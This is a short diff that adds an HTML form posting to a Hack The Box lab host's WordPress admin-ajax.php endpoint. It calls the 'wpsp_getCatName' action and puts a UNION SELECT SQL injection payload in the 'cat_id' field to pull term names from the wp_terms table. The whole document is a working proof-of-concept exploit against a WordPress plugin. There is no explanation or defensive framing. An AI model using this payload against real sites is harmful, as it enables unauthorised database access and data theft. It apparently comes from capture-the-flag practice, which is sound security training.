@@ -1,0 +1,5 @@
+<form action="https://brainfuck.htb/wp-admin/admin-ajax.php" method="post">
+    <input type="text" name="action" value="wpsp_getCatName">
+    <input type="text" name="cat_id" value="0 UNION SELECT 1,CONCAT(name,CHAR(58),slug),3 FROM wp_terms WHERE term_id=1">
+    <input type="submit" name="">
+</form>
